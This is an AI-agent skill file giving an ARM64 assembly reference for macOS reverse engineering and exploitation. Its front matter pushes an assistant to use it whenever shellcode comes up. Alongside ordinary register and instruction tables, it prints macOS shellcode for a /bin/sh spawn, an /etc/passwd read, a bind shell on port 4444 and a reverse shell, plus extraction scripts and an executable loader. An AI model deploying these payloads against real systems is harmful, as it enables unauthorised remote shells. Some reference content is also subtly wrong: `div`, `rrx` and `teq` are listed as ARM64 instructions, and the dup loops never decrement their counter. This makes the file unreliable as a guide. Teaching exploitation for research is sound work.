---
name: arm64-assembly-reference
description: ARM64 assembly language reference for macOS security and reverse engineering. Use this skill whenever the user asks about ARM64 assembly, registers, instructions, exception levels, calling conventions, shellcode, or macOS system calls. This includes questions about writing assembly code, understanding disassembly, creating shellcode, or working with ARM64 architecture concepts. Make sure to use this skill when users mention ARM64, aarch64, assembly, shellcode, syscalls, registers like x0-x30, or macOS binary exploitation.
---

# ARM64 Assembly Reference for macOS Security

This skill provides comprehensive reference material for ARM64 assembly language, with a focus on macOS security, reverse engineering, and exploitation.

## Exception Levels (EL)

ARMv8 defines four exception levels that control privilege and capabilities:

| Level | Name | Purpose |
|-------|------|--------|
| **EL0** | User Mode | Regular application code, least privileged |
| **EL1** | Kernel Mode | Operating system kernel, accessed via `SVC` from EL0 |
| **EL2** | Hypervisor Mode | Virtualization, accessed via `HVC` from EL1 |
| **EL3** | Secure Monitor | Secure boot/TEE (not used by modern macOS) |

**Key transitions:**
- EL0 → EL1: `SVC` (Supervisor Call) instruction
- EL1 → EL2: `HVC` (Hypervisor Call) instruction
- EL2 → EL3: `SMC` (Secure Monitor Call) instruction

## General-Purpose Registers

ARM64 has 31 general-purpose registers (`x0`-`x30`), each 64-bit. 32-bit operations use `w0`-`w30`.

### Register Categories

| Register(s) | Purpose | Volatile? |
|-------------|---------|----------|
| `x0`-`x7` | Function arguments, return value (`x0`) | Yes |
| `x8` | System call number (Linux) | Yes |
| `x9`-`x15` | Temporary/local variables | Yes |
| `x16`-`x17` | Intra-procedural call, **syscall number on macOS** | Yes |
| `x18` | Platform register (reserved on some systems) | Yes |
| `x19`-`x28` | Callee-saved (must preserve across calls) | No |
| `x29` | Frame pointer (`fp`) | No |
| `x30` | Link register (`lr`), holds return address | No |
| `sp` | Stack pointer (must be 16-byte aligned) | - |
| `pc` | Program counter (read-only via branches) | - |
| `xzr`/`wzr` | Zero register (always reads as 0) | - |

### Special Registers

- **`TPIDR_EL0`**: Thread-local storage base (readable/writable from EL0)
- **`TPIDR_EL1`**: Thread-local storage (readable from EL0, writable from EL1)

Access via `mrs` (read) and `msr` (write):
```armasm
mrs x0, TPIDR_EL0    ; Read TPIDR_EL0 into x0
msr TPIDR_EL0, x0    ; Write x0 into TPIDR_EL0
```

### SIMD/Floating-Point Registers

32 registers of 128-bit length, accessible at different widths:
- `Qn`: 128-bit
- `Dn`: 64-bit
- `Sn`: 32-bit
- `Hn`: 16-bit
- `Bn`: 8-bit

## PSTATE (Process State)

Stored in `SPSR_ELx` when exceptions occur. Key fields:

| Field | Description |
|-------|-------------|
| `N` | Negative result flag |
| `Z` | Zero result flag |
| `C` | Carry flag |
| `V` | Signed overflow flag |
| `nRW` | Register width (0 = AArch64) |
| `EL` | Current exception level |
| `SS` | Single-stepping (debugger) |
| `DAIF` | Exception masking (Debug, Async, IRQ, FIQ) |
| `SPS` | Stack pointer select (EL1+) |

**Note:** Not all instructions update flags. Use `cmp`, `tst`, or instructions with `s` suffix (e.g., `adds`, `subs`).

## Calling Convention

### Parameter Passing

1. **First 8 parameters**: `x0` through `x7`
2. **Additional parameters**: Passed on stack
3. **Return value**: `x0` (or `x0`+`x1` for 128-bit values)
4. **Preserved across calls**: `x19`-`x28`, `x29` (fp), `x30` (lr), `sp`

### Function Prologue

```armasm
stp x29, x30, [sp, #-16]!  ; Save frame pointer and link register
mov x29, sp                 ; Set new frame pointer
sub sp, sp, #<size>         ; Allocate stack space for locals
```

### Function Epilogue

```armasm
add sp, sp, #<size>         ; Deallocate stack space
ldp x29, x30, [sp], #16     ; Restore frame pointer and link register
ret                         ; Return to caller
```

## Common Instructions

### Data Movement

| Instruction | Description | Example |
|-------------|-------------|--------|
| `mov` | Move value between registers | `mov x0, x1` |
| `ldr` | Load from memory | `ldr x0, [x1]` |
| `str` | Store to memory | `str x0, [x1]` |
| `ldp` | Load pair of registers | `ldp x0, x1, [x2]` |
| `stp` | Store pair of registers | `stp x0, x1, [sp]` |
| `adrp` | Compute page address | `adrp x0, symbol` |
| `ldrsw` | Load signed 32-bit, extend to 64 | `ldrsw x0, [x1]` |

### Memory Addressing Modes

```armasm
ldr x2, [x1, #8]           ; Offset mode: x1 + 8
ldr x2, [x1, #8]!          ; Pre-indexed: load x1+8, update x1
ldr x0, [x1], #8           ; Post-indexed: load x1, then x1+8
ldr x1, =_start            ; PC-relative addressing
```

### Arithmetic

| Instruction | Description | Example |
|-------------|-------------|--------|
| `add`/`adds` | Add (with/without flags) | `add x0, x1, x2` |
| `sub`/`subs` | Subtract (with/without flags) | `sub x0, x1, x2` |
| `mul` | Multiply | `mul x0, x1, x2` |
| `div` | Divide | `div x0, x1, x2` |

**Shift operations:**
```armasm
add x5, x5, #1, lsl #12    ; x5 + (1 << 12) = x5 + 4096
```

### Shifts and Rotates

| Instruction | Description |
|-------------|-------------|
| `lsl` | Logical shift left (multiply by 2^n) |
| `lsr` | Logical shift right (unsigned divide by 2^n) |
| `asr` | Arithmetic shift right (signed divide by 2^n) |
| `ror` | Rotate right |
| `rrx` | Rotate right with extend (uses carry flag) |

### Bitfield Operations

| Instruction | Description | Example |
|-------------|-------------|--------|
| `bfm` | Bitfield move | `BFM Xd, Xn, #r` |
| `sbfm` | Signed bitfield move | `SBFM Xd, Xn, #r, #s` |
| `ubfm` | Unsigned bitfield move | `UBFM Xd, Xn, #r, #s` |
| `bfi` | Bitfield insert | `BFI X1, X2, #3, #4` |
| `bfxil` | Bitfield extract and insert | `BFXIL X1, X2, #3, #4` |
| `sbfiz` | Sign-extend and insert | `SBFIZ X1, X2, #3, #4` |
| `ubfiz` | Zero-extend and insert | `UBFIZ X1, X2, #3, #4` |

### Sign/Zero Extension

| Instruction | Description |
|-------------|-------------|
| `sxtb` | Sign-extend byte to 64-bit |
| `sxth` | Sign-extend halfword to 64-bit |
| `sxtw` | Sign-extend word to 64-bit |
| `uxtb` | Zero-extend byte to 64-bit |
| `uxth` | Zero-extend halfword to 64-bit |
| `uxtw` | Zero-extend word to 64-bit |

### Comparison

| Instruction | Description | Example |
|-------------|-------------|--------|
| `cmp` | Compare (alias of `subs` to zero) | `cmp x0, x1` |
| `cmn` | Compare negative (alias of `adds`) | `cmn x0, x1` |
| `ccmp` | Conditional compare | `ccmp x3, x4, 0, NE` |
| `tst` | Test bits (AND without store) | `tst x1, #7` |
| `teq` | Test equality (XOR without store) | `teq x0, x1` |

### Branching

| Instruction | Description | Example |
|-------------|-------------|--------|
| `b` | Unconditional branch | `b myFunction` |
| `bl` | Branch with link (call) | `bl myFunction` |
| `blr` | Branch to register | `blr x1` |
| `ret` | Return from subroutine | `ret` |
| `b.eq` | Branch if equal | `b.eq label` |
| `b.ne` | Branch if not equal | `b.ne label` |
| `cbz` | Compare and branch on zero | `cbz x0, label` |
| `cbnz` | Compare and branch on non-zero | `cbnz x0, label` |
| `tbz` | Test bit and branch on zero | `tbz x0, #8, label` |
| `tbnz` | Test bit and branch on non-zero | `tbnz x0, #8, label` |

### Conditional Select

| Instruction | Description | Example |
|-------------|-------------|--------|
| `csel` | Conditional select | `csel x0, x1, x2, EQ` |
| `csinc` | Conditional select and increment | `csinc x0, x1, x2, EQ` |
| `cinc` | Conditional increment | `cinc x0, x1, EQ` |
| `csinv` | Conditional select and invert | `csinv x0, x1, x2, EQ` |
| `cset` | Conditional set (0 or 1) | `cset x0, EQ` |
| `csetm` | Conditional set mask | `csetm x0, EQ` |

### System Calls

```armasm
mov x16, #59     ; syscall number (macOS uses x16)
svc #0x1337      ; trigger syscall (immediate doesn't matter)
```

## macOS System Calls

### BSD Syscalls

- Use `x16 > 0`
- Reference: `/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`
- Source: [syscalls.master](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)

### Mach Traps

- Use `x16 < 0` (negative numbers)
- Maximum: `MACH_TRAP_TABLE_COUNT` = 128
- Example: `_kernelrpc_mach_vm_allocate_trap` = `-10`
- Reference: [syscall_sw.c](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)

### Common Syscall Numbers

| Number | BSD Syscall | Description |
|--------|-------------|-------------|
| 1 | `exit` | Exit process |
| 2 | `fork` | Fork process |
| 59 | `execve` | Execute program |
| 97 | `socket` | Create socket |
| 98 | `connect` | Connect socket |
| 104 | `bind` | Bind socket |
| 106 | `listen` | Listen on socket |
| 30 | `accept` | Accept connection |
| 90 | `dup` | Duplicate file descriptor |

### Finding Syscall Information

```bash
# Extract libsystem_kernel.dylib from dyld cache
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# Or check source directly
cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h
```

### Comm Page

Kernel-owned memory page mapped into every user process for fast kernel access. Example: `gettimeofday` reads directly from comm page.

### objc_msgSend

Objective-C/Swift message sending:
- `x0`: `self` (instance pointer)
- `x1`: selector (method name)
- `x2`+: method arguments

Debug with LLDB:
```bash
(lldb) po $x0              # Show object
(lldb) x/s $x1             # Show selector string
(lldb) po [$x0 launchPath] # Show property
```

Enable logging: `NSObjCMessageLoggingEnabled=1`

## Shellcode Examples

### Basic Shell (execve /bin/sh)

```armasm
.section __TEXT,__text
.global _main
.align 2

_main:
    adr  x0, sh_path      ; Address of "/bin/sh"
    mov  x1, xzr          ; argv[1] = NULL
    mov  x2, xzr          ; envp = NULL
    mov  x16, #59         ; execve syscall
    svc  #0x1337

sh_path: .asciz "/bin/sh"
```

### Shell with Stack String

```armasm
.section __TEXT,__text
.global _main
.align 2

_main:
    ; Build "/bin/sh" in x1
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    
    str  x1, [sp, #-8]    ; Store on stack
    
    mov  x1, #8
    sub  x0, sp, x1       ; x0 = address of string
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

### Read /etc/passwd

```armasm
.section __TEXT,__text
.global _main
.align 2

_main:
    sub sp, sp, #48       ; Allocate stack space
    mov x1, sp            ; x1 = argv array address
    
    adr x0, cat_path
    str x0, [x1]          ; argv[0] = "/bin/cat"
    
    adr x0, passwd_path
    str x0, [x1, #8]      ; argv[1] = "/etc/passwd"
    str xzr, [x1, #16]    ; argv[2] = NULL
    
    adr x0, cat_path      ; x0 = "/bin/cat"
    mov x2, xzr           ; envp = NULL
    mov x16, #59          ; execve
    svc 0

cat_path: .asciz "/bin/cat"
passwd_path: .asciz "/etc/passwd"
```

### Bind Shell (port 4444)

```armasm
.section __TEXT,__text
.global _main
.align 2

_main:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov  x16, #97
    lsr  x1, x16, #6      ; x1 = 1 (SOCK_STREAM)
    lsl  x0, x1, #1       ; x0 = 2 (AF_INET)
    mov  x2, xzr
    svc  #0x1337
    mvn  x3, x0           ; Save socket fd
    
    ; bind(s, &sockaddr, 16)
    mov  x1, #0x0210      ; sin_len=16, sin_family=2
    movk x1, #0x5C11, lsl #16  ; sin_port=4444
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #104
    svc  #0x1337
    
    ; listen(s, 2)
    mvn  x0, x3
    lsr  x1, x2, #3       ; x1 = 2
    mov  x16, #106
    svc  #0x1337
    
    ; accept(s, 0, 0)
    mvn  x0, x3
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30
    svc  #0x1337
    mvn  x3, x0           ; Save client fd
    
    ; dup(c, 2) -> dup(c, 1) -> dup(c, 0)
    lsr  x2, x16, #4      ; x2 = 2
    lsl  x2, x2, #2       ; x2 = 8 (loop counter)
    
_dup_loop:
    mvn  x0, x3
    lsr  x1, x2, #1
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  _dup_loop
    
    ; execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

### Reverse Shell (127.0.0.1:4444)

```armasm
.section __TEXT,__text
.global _main
.align 2

_main:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337
    mvn  x3, x0
    
    ; connect(s, &sockaddr, 16)
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16   ; port 4444
    movk x1, #0x007F, lsl #32   ; 127.0.0.1
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98
    svc  #0x1337
    
    ; dup(s, 2) -> dup(s, 1) -> dup(s, 0)
    lsr  x2, x2, #2
_dup_loop:
    mvn  x0, x3
    lsr  x1, x2, #1
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  _dup_loop
    
    ; execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov  x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

## Building and Testing Shellcode

### Compile Assembly

```bash
# Assemble
as -o shell.o shell.s

# Link (macOS)
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# Or with xcrun
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```

### Extract Shellcode Bytes

```bash
# For older macOS
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n '\x'$c
done

# For newer macOS (byte order fix)
for s in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
    echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```

### Test Shellcode (C Loader)

```c
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();
char shellcode[] = "<INSERT SHELLCODE HERE>";

int main() {
    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, 
                     MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
    memcpy(ptr, shellcode, sizeof(shellcode));
    mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
    sc = ptr;
    sc();
    return 0;
}
```

Compile: `gcc loader.c -o loader`

## AArch32 Execution State

ARMv8 can execute 32-bit code in AArch32 state:

### Instruction Sets
- **A32**: 32-bit ARM instructions
- **T32**: 16/32-bit Thumb instructions

### Transition
- 64-bit → 32-bit: Lower exception level (e.g., EL1 → EL0)
- Set bit 4 of `SPSR_ELx` to 1
- Use `ERET` to transition

### AArch32 Registers

| Register | Purpose |
|----------|--------|
| `r0`-`r14` | General purpose |
| `r11` | Frame pointer |
| `r12` | Intra-procedural call |
| `r13` | Stack pointer (16-byte aligned) |
| `r14` | Link register |
| `r15` | Program counter |

### CPSR (Current Program Status Register)

Similar to PSTATE in AArch64:
- **APSR**: Application flags (N, Z, C, V, Q, GE)
- **J/T bits**: Instruction set selection (J=0, T=0 → A32; J=0, T=1 → T32)
- **E bit**: Endianness
- **Mode bits**: Current execution mode

## Tips for Reverse Engineering

1. **Look for prologue/epilogue patterns** to identify function boundaries
2. **Check x16 before svc** to identify syscall numbers
3. **Follow x0-x7** to trace function arguments
4. **Use x29 (fp)** to navigate stack frames
5. **Watch x30 (lr)** for return addresses
6. **Check for objc_msgSend** in Objective-C/Swift binaries
7. **Use LLDB** to inspect registers at breakpoints
8. **Reference libsystem_kernel.dylib** for syscall implementations

## References

- [Apple Swift ABI - ARM64 Calling Convention](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
- [XNU syscalls.master](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)
- [macOS ARM64 Shellcode](https://github.com/daem0nc0re/macOS_ARM64_Shellcode)
- [ARM Architecture Reference Manual](https://developer.arm.com/documentation)
